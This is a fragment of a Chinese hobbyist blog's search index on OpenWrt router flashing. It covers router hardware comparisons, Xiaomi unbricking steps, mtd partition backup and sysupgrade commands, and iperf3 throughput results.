<li>\u7ea2\u7c73AX3000\uff08\u6bd4\u8f83\u5e38\u89c1\uff09\uff0cIPQ5000\uff1a\u53cc\u6838A53@1.0GHz, 256(ram) + 128\uff1aRedmi\u8def\u7531\u5668AX3000\u7acb\u5373\u8d2d\u4e70-\u5c0f\u7c73\u5546\u57ce</li> <li>\u5c0f\u7c73AX3000\uff1aIPQ5000\uff1a\u53cc\u6838A53@1.0GHz, 256(ram) + 128\uff1a\u5c0f\u7c73\u8def\u7531\u5668AX3000\u7acb\u5373\u8d2d\u4e70-\u5c0f\u7c73\u5546\u57ce (mi.com)</li> <li>\u7ea2\u7c73AX3000\u6a21\u5177\u548cAX6S\u4e00\u6837\uff0c\u4e3a\u767d\u8272\u3002\u5c0f\u7c73AX3000\u4e3a\u9ed1\u8272\u56db\u68f1\u67f1\u3002</li> </ul> </li> <li>AX5400<ul> <li>\u7ea2\u7c73AX5400\uff0cIPQ5018\uff1a\u53cc\u6838A53@1.0GHz\uff0c512(ram) + 128\uff1a\u7ea2\u7c73AX5400\u5343\u5146\u7248\u62c6\u673a\uff0c\u770b\u770b\u4e0e\u7535\u7ade\u7248\u6709\u4ec0\u4e48\u5dee\u522b-\u8def\u7531\u5668\u4ea4\u6d41 (acwifi.net)</li> </ul> </li> <li>AX6000<ul> <li>\u5c0f\u7c73AX6000<ul> <li>IPQ5018, 2\u6838A53@1.0Ghz, 512(ram) + 128</li> <li>\u4f7f\u7528\u7684SoC IPQ5018\u4e3a\u9ad8\u901a\u6c89\u6d78\u5f0f\u5bb6\u5ead\u8054\u7f51\u5e73\u53f0\uff0c\u4e0d\u5982\u9ad8\u901a\u4e13\u4e1a\u8054\u7f51\u5e73\u53f0\u7684IPQ8071A\uff08AX3600\u4e0a\u7684\uff09</li> </ul> </li> <li>\u7ea2\u7c73AX6000\uff08\u5f88\u5f3a\uff09<ul> <li>MT7986A, 4\u6838A53@2.0Ghz, 512(ram) + 128\uff1a[OpenWrt Wiki] Xiaomi Redmi AX6000</li> <li>\u7ea2\u7c73AX6000\u62c6\u673a\uff0c\u6700\u4fbf\u5b9c\u7684\u56db\u68382.0GHz-\u8def\u7531\u5668\u4ea4\u6d41 (acwifi.net)</li> </ul> </li> </ul> </li> </ul> <p>\u53c2\u8003</p> <ul> <li>(33 \u5c01\u79c1\u4fe1 / 71 \u6761\u6d88\u606f) \u8def\u7531\u5668\u7ea2\u7c73ax3000\u548c\u7ea2\u7c73ax6\u9009\u62e9\u54ea\u4e2a? - \u77e5\u4e4e (zhihu.com)</li> <li>\u5c0f\u7c73openwrt\u9875\u9762\uff1a[OpenWrt Wiki] Xiaomi</li> <li>\u5e38\u89c1MediaTek SoC\uff1aMediaTek - WikiDevi.Wi-Cat.RU</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#2023-wifi6\u4ea7\u54c1","title":"2023 wifi6\u4ea7\u54c1","text":"<p>\u73b0\u5728\u9700\u6c42wifi6\uff0c\u4e14\u4fe1\u53f7\u8986\u76d6\u5e7f</p> <ul> <li>\u5c0f\u7c73wr30u\uff1a\u8fd0\u8425\u5546\u5b9a\u5236\u7248</li> <li>360 T7\uff1a\u548c\u4e0a\u8005\u786c\u4ef6\u4e00\u6478\u4e00\u6837\u300212v 1A</li> </ul> <p>wr30u: wifi6: \u5c0f\u7c73WR30U\u65e0\u7ebf\u8def\u7531\u5668\u62c6\u673a AX3000\u8054\u901a\u5b9a\u5236\u7248-\u8def\u7531\u5668\u4ea4\u6d41 (acwifi.net) 2023\u5e74\u652f\u6301\u5237\u673a\u7684\u8def\u7531\u5668\u5927\u5168\uff08\u5efa\u8bae\u6536\u85cf\uff09 - \u77e5\u4e4e (zhihu.com)</p> <ul> <li>AX1800\uff1acr660x</li> <li>AX3000\uff1acr880x\uff1a135</li> </ul> <p>618 \u60f3\u4e70\u53f0\u8def\u7531\u5668\u6c42\u63a8\u8350 - V2EX 150\u7684T7 512\u6539\uff1aWR30U\u8def\u7531\u5230\u4e86\u968f\u624b\u6d4b\u6d4b - \uff30\uff23\u6570\u7801 - Stage1st - stage1/s1 \u6e38\u620f\u52a8\u6f2b\u8bba\u575b (saraba1st.com)</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#cpu\u5bf9\u6bd4","title":"CPU\u5bf9\u6bd4","text":"<p>\u53c2\u8003\uff1a</p> <ul> <li>[\u8f6c\u8d34] \u65e0\u7ebf\u8def\u7531\u5668CPU\u6d45\u6790 MT7621A\u3001 BCM47189 \u5230\u5e95\u8c01\u5f3a\uff1f-\u65b0\u624b\u5165\u95e8\u53ca\u5176\u5b83(\u786c\u4ef6)-\u6069\u5c71\u65e0\u7ebf\u8bba\u575b (right.com.cn)</li> </ul> <ul> <li>\u6811\u8393\u6d3e\u7cfb\u5217\u5904\u7406\u5668\uff1aRaspberry Pi Documentation - Processors<ul> <li>Raspberry Pi 2 Model B\uff1a BCM2836(quad-core Cortex-A7 )</li> <li>Raspberry Pi 3 Model B\uff1aBCM2837( quad-core Cortex-A53@1.2)<ul> <li>50% faster than the Raspberry Pi 2.</li> </ul> </li> <li>Raspberry Pi 3 Models A+, B+: BCM2837B0(quad-core Cortex-A53@1.4)<ul> <li>17% faster than the original Raspberry Pi 3</li> </ul> </li> <li>Raspberry Pi 4 Model B: BCM2837(quad-core Cortex-A72@1.5 GHz)<ul> <li>50% faster than the Raspberry Pi 3B+</li> </ul> </li> </ul> </li> </ul> <ul> <li>ARM\u6838\u5bf9\u6bd4\uff1aList of ARM processors - Wikipedia<ul> <li>Cortex-A7: 1.9 DMIPS/MHz per core</li> <li>A53: 2.3 DMIPS/MHz</li> <li>A72: 6.3-7.3 DMIPS/MHz</li> </ul> </li> <li>MIPS\u6838\uff1aMIPS Classic Processor Cores - Imagination Technologies<ul> <li>1004K: 1.6 DMIPS/MHz</li> </ul> </li> <li>74k: 1.93 DMIPS/MHz\uff1aCSAC\u8def\u7531\u5668\uff1a71</li> </ul> <ul> <li>newifi3-d2-firmware/README.md at master \u00b7 sawaYch/newifi3-d2-firmware (github.com)</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#2024-\u65b0\u9700\u6c42","title":"2024 \u65b0\u9700\u6c42","text":"<p>\u5bb6\u91cc\u642d\u5efa\u7684\u8f6f\u8def\u7531 + \u591a AP \u5728\u4e00\u6b21\u65ad\u7535\u540e\u4e0a\u4e0d\u4e86\u7f51\u3002\u65e0\u6cd5\u8fdc\u7a0b\u8bbf\u95ee\u65e0\u6cd5\u4fee\u590d\u3002\u7531\u4e8e\u8bbe\u7f6e\u4e86\u6865\u63a5 + \u8def\u7531\u5668\u62e8\u53f7\u3002\u6240\u4ee5\u4e5f\u65e0\u6cd5\u6307\u5bfc\u7236\u6bcd\u6362\u56de\u539f\u6765\u7684\u817e\u8fbe\u8def\u7531\u5668\u3002</p> <p>\u5e73\u65f6\u548c\u7236\u6bcd\u901a\u8bdd\u65f6\uff0c\u7236\u4eb2\u8001\u5e08\u62b1\u6028\u8bf4\u7f51\u7edc\u4e0d\u597d\u3002\u5e94\u8be5\u662f\u4ed6\u603b\u662f\u8fde\u63a5\u5230\u4f4d\u7f6e\u4e0d\u5bf9\u7684 AP\uff0c\u8ba9\u4ed6\u65ad\u5f00 wifi \u91cd\u65b0\u8fde\u63a5\u4e00\u4e0b\u5f80\u5f80\u80fd\u89e3\u51b3\u95ee\u9898\u3002</p> <p>\u4e8e\u662f\u8fd9\u6b21\u51b3\u5b9a\u6362\u4e00\u4e2a\u65e0\u7ebf\u4fe1\u53f7\u597d\u7684\u8def\u7531\u5668\uff0c\u91c7\u7528\u5355\u4e2a\u8def\u7531\u5668\u7684\u65b9\u6848\u3002\u7136\u540e\u8ba9\u5bbd\u5e26\u5e08\u5085\u5e2e\u5fd9\u5b89\u88c5\u4e00\u4e0b\u3002</p> <p>\u636e\u8bf4\u7ef4\u4fee\u5f88\u66f2\u6298</p> <p>\u7531\u4e8e\u4e0d\u662f\u79fb\u52a8\u7684\u8def\u7531\u5668\uff0c\u662f\u81ea\u5df1\u7684\u8def\u7531\u5668\u7684\u95ee\u9898\uff0c\u6536\u4e86 30 \u5143\u7684\u7ef4\u4fee\u8d39\u3002\u4e2d\u5348 1 \u70b9 \u6253 10086\uff0c\u4e0b\u5348 4 \u70b9\u5c31\u6765\u7ef4\u4fee\u4e86\u8fd9\u70b9\u4e0d\u9519\u3002\u636e\u8bf4\u641e\u4e86\u5f88\u4e45\uff0c\u53ef\u80fd\u662f\u6211\u8bbe\u7f6e\u4e86\u6865\u63a5\u7684\u539f\u56e0\uff0c\u5bbd\u5e26\u5e08\u5085\u641e\u4e86\u534a\u5929\u6ca1\u641e\u5b9a\uff0c\u6700\u540e\u628a\u5149\u732b\u6362\u4e86\u4e2a\u65b0\u7684\uff08\u597d\u50cf\u8bf4\u633a\u597d\u7684\uff0c\u9002\u7528\u4e8e\u5343\u5146\u5bbd\u5e26\uff09\u6211\u4e5f\u8ba9\u4ed6\u5e2e\u5fd9\u628a\u4e00\u697c\u539f\u672c\u7684 AP \u63a5\u4e0a\u4e86\u3002\u597d\u5728 AP \u4e0d\u9700\u8981\u989d\u5916\u8bbe\u7f6e\uff0c\u63d2\u4e0a\u7f51\u7ebf\u5c31\u80fd\u7528\u3002\u731c\u6d4b\u73b0\u5728\u7f51\u7edc\u5e94\u8be5\u662f\u5149\u732b\u62e8\u53f7\uff0c\u4e3b\u8def\u7531\u5668 dhcp\uff0c\u4e5f\u5c31\u662f\u6709\u4e24\u6b21 NAT</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u4e4b\u540e\u7684\u7f51\u7edc\u89c4\u5212","title":"\u4e4b\u540e\u7684\u7f51\u7edc\u89c4\u5212","text":"<p>\u7ecf\u8fc7\u8fd9\u6b21\u4e8b\u4ef6\u540e\uff0c\u610f\u8bc6\u5230\u7f51\u7edc\u8fd8\u662f\u9700\u8981\u7b80\u5355\u7a33\u5b9a\u3002\u8f6f\u8def\u7531\u505a\u4e3b\u8def\u7531\u8fd9\u79cd\u65b9\u6848\u4e0d\u9002\u5408\u5bb6\u91cc\uff0c\u56e0\u4e3a\u51fa\u4e86\u95ee\u9898\uff0c\u6839\u672c\u65e0\u6cd5\u8fdc\u7a0b\u6307\u5bfc\u7236\u6bcd\u4fee\u590d\u3002\u751a\u81f3\u5bbd\u5e26\u5e08\u5085\u4e5f\u4e0d\u77e5\u9053\u600e\u4e48\u4fee\u590d\u3002\u800c\u4e14\u53ea\u8981\u95ee\u9898\u51fa\u5728\u5149\u732b\u4e0a\uff0c\u8fd0\u8425\u5546\u5c31\u53ef\u4ee5\u514d\u8d39\u7ed9\u6211\u4fee\u3002\u56e0\u6b64\u8003\u8651\u5c06\u8f6f\u8def\u7531\u4f5c\u4e3a\u65c1\u8def\u7531\u3002\u65b9\u6848\u5982\u4e0b</p> <p></p> <p></p> <p>\u9700\u6c42 - \u4ee5\u540e\u80fd\u591f\u5237 openwrt - \u65e0\u7ebf\u4fe1\u53f7\u597d\uff0c\u80fd\u591f\u8986\u76d6 100 \u5e73\u519c\u6751\u81ea\u5efa\u623f\u3002\u5149\u7ea4\u5165\u6237\u5728\u4e8c\u697c\uff0c\u56e0\u6b64\u8def\u7531\u5668\u9700\u8981\u80fd\u591f\u8986\u76d6 1 \u697c \u548c 2 \u697c\u3002 - \u6709 2.5 G \u63a5\u53e3   - \u56e0\u4e3a\u60f3\u5230\u65e2\u7136\u90fd\u5347\u7ea7\u4e86\uff0c\u9700\u8981\u628a\u6211\u8f6f\u8def\u7531 2.5 G \u53e3\u5229\u7528\u8d77\u6765   - \u5355 2.5 G \u548c\u53cc 2.5 G \u9009\u62e9     - \u7a81\u7136\u610f\u8bc6\u5230\uff0c\u5728\u6211\u7684\u8f6f\u8def\u7531\u6709 4 \u53e3 2.5 G \u7684\u60c5\u51b5\u4e0b\u3002\u5355 2.5 G \u591f\u7528\u4e86\uff0c\u5e76\u4e14\u8fd8\u4fbf\u5b9c\u5f88\u591a\u3002</p> <p>xdr 4288TP-LINK\u8f7b\u821fXDR4288\u62c6\u673a\uff0c\u53cc\u9891\u4e0d\u5bf9\u79f0\u7a7a\u95f4\u6d41-\u8def\u7531\u5668\u4ea4\u6d41 (acwifi.net)</p> <p>\u4e24\u4e09\u53f0\u7ec4\u7f51\u7528\u7684\u8bdd\uff0c\u8fd9\u4e00\u53f0\u505a\u4e3b\u8def\u7531\uff0c\u4e5f\u4e0d\u9700\u8981\u591a\u5f3a\u7684\u65e0\u7ebf\u3002\u5982\u679c\u8981\u4e00\u53f0\u5168\u80fd\u5f62\u7684\uff0c\u5c31\u57286088\u548c6086\u4e4b\u95f4\u9009\u62e9\u5427\u3002\u90fd\u662f\u4f4e\u6e29\u4f4e\u70ed\u7684\uff0c\u76f8\u5bf9\u9ad8\u901aIPQ5000\u7cfb\u5217\u65b9\u6848\u7684\u673a\u578b\uff01\u4eac\u4e1c\u4ef7\u683c669\u5143\uff0c\u6309\u9700\u9009\u62e9\u5427\u3002</p> <p>xdr 6088\uff1a\u8f7b\u821fXDR6088\u62c6\u673a\uff0c\u53cc2.5G\u7f51\u53e3\u7684\u65e0\u7ebf\u8def\u7531\u5668-\u8def\u7531\u5668\u4ea4\u6d41 (acwifi.net)</p> <p>\u53d1\u73b0\u76f4\u63a5\u770b\u8fd9\u91cc\uff0c\u5c31\u6709\u63a8\u8350\u7684\u6027\u4ef7\u6bd4\u8def\u7531\u5668\uff1a\u7279\u4ef7\u8def\u7531\u6c47\u603b-\u8def\u7531\u5668\u4ea4\u6d41 (acwifi.net)</p> <ul> <li>\u90fd\u8bf4 xdr 5480 \u4fe1\u53f7\u597d\u3002\u54b8\u9c7c\u4ef7\u683c 265 \uff082024/09/11\uff09\u3002\u4f46\u662f\u4e0d\u80fd\u5237 op\uff0c \u6709\u4e00\u4e2a SPF 2.5G \u53e3\uff08SPF \u6a21\u5757\u5927\u6982 50-100\u5143\uff09\u3002\u9002\u5408\u505a AP\u3002</li> <li>xdr6088\u3002\u54b8\u9c7c\u4ef7\u683c 419\uff082024/09/11\uff09\u3002\u67d0\u4e2a\u7248\u672c\u53ef\u4ee5\u514d\u62c6\u5237 op\u3002\u53cc 2.5G<ul> <li>7986A, 512+128</li> </ul> </li> </ul> <p>\u65e0\u7ebf\u4fe1\u53f7\u8fbe\u5230XDR5480/6088\u540c\u7ea7\u6216\u4ee5\u4e0a\u7684\u53ef\u9b54\u6539\u8def\u7531 - \u7535\u8111\u8ba8\u8bba(\u65b0) - Chiphell - \u5206\u4eab\u4e0e\u4ea4\u6d41\u7528\u6237\u4f53\u9a8c</p> <p>\u4e0d\u8fc7\u6211\u611f\u89c9\u6211\u9700\u8981\u4e00\u4e2a\u4e0d\u9519\u7684\u8def\u7531\u505a\u4e3b\u8def\u7531\uff0c\u540c\u65f6\u8f6f\u8def\u7531\u4f5c\u4e3a\u5b50\u8def\u7531\u3002\u8fd9\u6837\u5b50\u53ef\u4ee5\u907f\u514d\u8f6f\u8def\u7531\u6302\u6389\uff0c\u6574\u4e2a\u7f51\u7edc\u6302\u6389\u3002\u7ec4\u7f51\u611f\u89c9\u5728\u8f6f\u8def\u7531\u4e0a\u7ec4\u3002</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u5237\u673a\u8fc7\u7a0b\u603b\u7ed3","title":"\u5237\u673a\u8fc7\u7a0b\u603b\u7ed3","text":"<p>\u4ee5\u7ea2\u7c73AC2100\u53ef\u80fd\u7684\u5237\u673a\u4e3a\u4f8b\uff0c\u6db5\u76d6\u4e86openwrt\u7684\u5404\u79cd\u60c5\u51b5\uff1a\u5237breed\uff0c\u6062\u590d\uff0c\u4e34\u65f6\u955c\u50cf</p> <ul> <li>\u5efa\u8bae\u76f4\u63a5\u4f7f\u7528\u5b98\u65b9openwrt\u955c\u50cf + \u5b98\u65b9\u5b89\u88c5\u65b9\u5f0f\u3002\u51e0\u6b21\u4f7f\u7528breed\u90fd\u9047\u5230\u4e86\u95ee\u9898\uff0c\u800c\u5c0f\u7c73\u5b98\u65b9\u6062\u590d\u5de5\u5177\u4e5f\u633a\u597d\u7528\u7684\u3002</li> </ul> <ul> <li> <p>\u7b2c\u4e00\u6b21\u81ea\u5df1\u5237\u673a\u7ea2\u7c73AC2100[[\u8bb0\u5f55\u7ea2\u7c73AC2100\u6298\u817e]]\uff0c\u4e00\u5f20\u7cbe\u534e\u56fe</p> <p></p> </li> </ul> <ul> <li>\u8def\u7531\u5668\u5237\u51fa\u95ee\u9898\uff0c\u4fee\u590d\u7ecf\u9a8c\u3002\u77e5\u9053\u4e86\u5907\u4efd\u7684\u91cd\u8981\u6027[[\u8bb0\u5f55\u8bb0\u4e00\u6b21\u8def\u7531\u5668\u5237\u51fa\u95ee\u9898\u4fee\u590d\u8fc7\u7a0b]]</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u5c0f\u7c73\u8def\u7531\u5668\u6551\u7816","title":"\u5c0f\u7c73\u8def\u7531\u5668\u6551\u7816","text":"","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u6709\u5b98\u65b9-bootloader-\u7684\u60c5\u51b5","title":"\u6709\u5b98\u65b9 bootloader \u7684\u60c5\u51b5","text":"<p>\u8bf4\u660e\uff1a</p> <p>\u5b98\u65b9\u7684\u5f15\u5bfc\u7a0b\u5e8f\u4f7f\u7528\u7684\u662f uboot\uff0c\u4f4d\u4e8e flash \u7684 Bootloader \u5206\u533a\uff0c\u800c\u5b98\u65b9\u56fa\u4ef6\u5219\u4f4d\u4e8e OS1 \u5206\u533a\uff08\u7ea2\u7c73 AC2100\uff09\u3002\u6b63\u5e38\u5237 openwrt \u7684\u8fc7\u7a0b\u4e2d\u4e0d\u4f1a\u4fee\u6539 bootloader\u3002\u53ea\u8981\u8fd8\u4fdd\u7559\u7740\u5b98\u65b9 bootloader\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7\u5b98\u65b9\u4fee\u590d\u5de5\u5177\u6062\u590d\u3002</p> <p>\u6b65\u9aa4\uff1a</p> <ol> <li>\u4e0b\u8f7d<code>\u5c0f\u7c73\u8def\u7531\u5668\u4fee\u590d\u5de5\u5177</code>\u548c\u5b98\u65b9\u955c\u50cf\uff1a\u3010\u4e0b\u8f7d\u6c47\u603b\u3011\u5ba2\u6237\u7aef/ROM \u4e0b\u8f7d - \u5c0f\u7c73\u793e\u533a (xiaomi.cn)</li> <li>\u8def\u7531\u5668\u901a\u7535\uff0cPC \u901a\u8fc7\u7f51\u7ebf\u8fde\u63a5\u5230\u8def\u7531\u5668 LAN \u53e3</li> <li>\u6253\u5f00<code>MIWIFIRepairTool.x86.exe</code></li> <li>\u9009\u62e9\u955c\u50cf</li> <li>\u9009\u62e9\u7f51\u5361\uff08\u53ef\u4ee5\u5728\u7f51\u7edc\u4e2d\u5fc3\u4e2d\u5c06\u5176\u5b83\u7f51\u5361\u7981\u7528\uff09</li> <li>\u65ad\u5f00\u8def\u7531\u5668\u7535\u6e90\uff0c\u6309\u4f4f rst \u952e\uff08\u4e5f\u6709\u53ef\u80fd\u9700\u8981\u7528\u9488\u6233\uff09\uff0c\u7136\u540e\u63a5\u4e0a\u7535\u6e90\uff0c\u7b49\u5f85\u9ec4\u706f\u95ea\u70c1\uff08\u4e24\u4e2a\u706f\uff0c\u4e00\u4e2a\u662f\u6709\u7535\u6e90\u6807\u5fd7\uff0c\u4e00\u4e2a\u6709\u4e92\u8054\u7f51\u6807\u5fd7\uff0c\u8fd9\u91cc\u4e3a\u7535\u6e90\u706f\u90a3\u4e2a\uff09</li> <li>\u8f6f\u4ef6\u81ea\u52a8\u4e0a\u4f20\u955c\u50cf</li> <li>\u4fdd\u6301\u8010\u5fc3\u7b49\u5f85\u8def\u7531\u5668\u9ec4\u706f\u53d8\u84dd\uff08\u4e2d\u95f4\u8fc7\u7a0b\u4fdd\u6301\u9ec4\u706f\uff09\uff0c\u4eb2\u6d4b\u9700\u8981 4 \u5206\u949f</li> <li>\u65ad\u7535\u540e\u91cd\u65b0\u63a5\u4e0a\u7535\u6e90\uff0c\u8def\u7531\u5668\u91cd\u542f</li> </ol>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u5237\u4e86-breed","title":"\u5237\u4e86 breed","text":"<p>\u8bf4\u660e\uff1a</p> <p>breed \u81ea\u8eab\u4fbf\u662f\u4e00\u4e2a bootloader\uff0c\u5237\u5b8c breed \u540e\u4f1a\u8986\u76d6\u539f\u672c\u7684 bootloader\u3002\u5982\u679c\u60f3\u590d\u539f\uff0c\u53ef\u901a\u8fc7 breed \u7684\u529f\u80fd\uff0c\u91cd\u65b0\u5237\u56de\u5b98\u65b9 bootloader\u3002\u5f3a\u70c8\u5efa\u8bae\u5237 breed \u524d\uff0c\u5148\u5907\u4efd\u539f\u672c\u7684 bootloader \u4ee5\u53ca\u6574\u4e2a flash\u3002\u5982\u679c\u6ca1\u5907\u4efd\uff0c\u8fd9\u91cc\u662f\u6069\u5c71\u4e0a\u6536\u96c6\u7684\u5c0f\u7c73\u5b98\u65b9 bootloader \u4e0b\u8f7d\uff1a\u8bba\u575b\u6536\u96c6\u7684\u51e0\u4e2a\u5c0f\u7c73\u8def\u7531\u5668\u5b98\u65b9 bootloader - \u6069\u5c71\u65e0\u7ebf\u8bba\u575b</p> <p>\u6b65\u9aa4\uff1a</p> <ol> <li>\u901a\u8fc7 breed \u5237\u56de\u5b98\u65b9 bootloader</li> <li>\u901a\u8fc7\u5b98\u65b9\u4fee\u590d\u5de5\u5177\u4fee\u590d</li> </ol>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u5e38\u7528\u64cd\u4f5c","title":"\u5e38\u7528\u64cd\u4f5c","text":"","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u5237\u4e4b\u524d\u5907\u4efd-mtd-\u5206\u533a","title":"\u5237\u4e4b\u524d\u5907\u4efd mtd \u5206\u533a","text":"<p>\u8def\u7531\u5668 flash \u6709\u82e5\u5e72\u5206\u533a\uff0c\u5176\u4e2d\u6709\u4e00\u4e2a\u5206\u533a\u5b58\u50a8\u8def\u7531\u5668 MAC \u5730\u5740\u3001\u65e0\u7ebf\u6821\u51c6\u53c2\u6570\u7b49\u3002\u82e5\u635f\u574f\u53ef\u80fd\u5bfc\u81f4\u65e0\u7ebf\u4fe1\u53f7\u5f31\u7b49\u95ee\u9898\u3002\u56e0\u6b64\u5237\u4e4b\u524d\u6700\u597d\u5907\u4efd\u3002 \u67e5\u770b mtd \u5206\u533a</p> <pre><code>root@XiaoQiang:~# cat /proc/mtd\ndev:    size   erasesize  name\nmtd0: 07f80000 00020000 \"ALL\"\nmtd1: 00080000 00020000 \"Bootloader\"\nmtd2: 00040000 00020000 \"Config\"\nmtd3: 00040000 00020000 \"Bdata\"\nmtd4: 00040000 00020000 \"Factory\"\nmtd5: 00040000 00020000 \"crash\"\nmtd6: 00040000 00020000 \"crash_syslog\"\nmtd7: 00040000 00020000 \"reserved0\"\nmtd8: 00400000 00020000 \"kernel0\"\nmtd9: 00400000 00020000 \"kernel1\"\nmtd10: 02000000 00020000 \"rootfs0\"\nmtd11: 02000000 00020000 \"rootfs1\"\nmtd12: 03580000 00020000 \"overlay\"\nmtd13: 012a6000 0001f000 \"ubi_rootfs\"\nmtd14: 030ec000 0001f000 \"data\"\n</code></pre> <p>\u5907\u4efd factory \u5206\u533a\uff08\u5c0f\u7c73\u8def\u7531\u5668\u4e00\u822c\u662f factory \u5b58\u50a8\u4e86\u4e0a\u8ff0\u90a3\u4e9b\u6570\u636e\uff09</p> <pre><code>cat /dev/mtd4 &gt; /tmp/factory.bin\n</code></pre> <p>\u4e4b\u540e\u901a\u8fc7 scp \u590d\u5236\u5230\u672c\u5730</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#snapshot-\u7684\u8bf4\u660e","title":"snapshot \u7684\u8bf4\u660e","text":"<p>snapshot \u662f\u5f00\u53d1\u7248\u5206\u652f</p> <ul> <li>\u9ed8\u8ba4\u6ca1\u6709\u5b89\u88c5 luci\uff08\u6ca1\u6709\u7f51\u9875\u754c\u9762\uff09</li> <li>\u4e0a\u6e38\u6bcf\u5929\u90fd\u4f1a\u7f16\u8bd1\u4ea7\u751f\u65b0\u7684 snapshot\u3002\u5bf9\u4e8e kernel mod \u76f8\u5173\u8f6f\u4ef6\uff0c\u4e0d\u662f\u540c\u4e00\u6b21\u7f16\u8bd1\u5219\u65e0\u6cd5\u5b89\u88c5\u3002</li> <li>[OpenWrt Wiki] Installing OpenWrt development snapshots</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u547d\u4ee4\u884c\u5b89\u88c5-sysupgradebin","title":"\u547d\u4ee4\u884c\u5b89\u88c5 sysupgrade.bin","text":"<ul> <li>[OpenWrt Wiki] Upgrading OpenWrt firmware using CLI</li> </ul> <pre><code>sysupgrade -v /tmp/firmware_image.bin\n\n#If sysupgrade is not available.\n# Flash firmware\nmtd -r write /tmp/firmware_image.bin firmware\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u5907\u4efd\u6062\u590d-cli","title":"\u5907\u4efd\u6062\u590d CLI","text":"<ul> <li>\u5b98\u65b9\uff1a[OpenWrt Wiki] Backup and restore</li> </ul> <p>\u81ea\u5df1\u5b9e\u73b0\u4e86\u4e00\u4e2a\u81ea\u52a8\u914d\u7f6e openwrt \u811a\u672c</p> <ul> <li>TheRainstorm/my-openwrt-config (github.com)</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u6027\u80fd\u6d4b\u8bd5","title":"\u6027\u80fd\u6d4b\u8bd5","text":"","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#iperf3","title":"iperf3","text":"<p>ax6s &amp; mi4a</p> \u6d4b\u8bd5\u76ee\u7684 \u8fde\u63a5 src dst speed(Mb/s) \u5907\u6ce8 ax6s LAN \u6027\u80fd \u5343\u5146 USB \u7f51\u5361 tianyi310 ax6s 941 ax6s \u65e0\u7ebf\u6027\u80fd wifi6 5Ghz@1201 s3pro ax6s 626 mi4a LAN \u6027\u80fd 2.5G \u7f51\u5361 ryzen mi4a 470 \u96a7\u9053\u6027\u80fd tianyi310 ryzen 118 \u96a7\u9053\u6027\u80fd mi4a ax6s 136 ax6s mi4a 149 mi4a \u4ea4\u6362\u6027\u80fd ryzen - mi4a - p2w ryzen p2w 943 \u7ed3\u679c\u5c45\u7136\u6bd4 ryzen - mi4a \u8fd8\u8981\u5feb\uff01 <p>\u5c06 r4a \u66ff\u6362\u6389\u540e | \u6d4b\u8bd5\u76ee\u7684 | src       | dst       | speed(Mb/s) | \u5907\u6ce8 | | -------- | --------- | --------- | ----------- | ---- | | p2w      | ryzen     | p2w       | 936     |      | |          | p2w       | ryzen 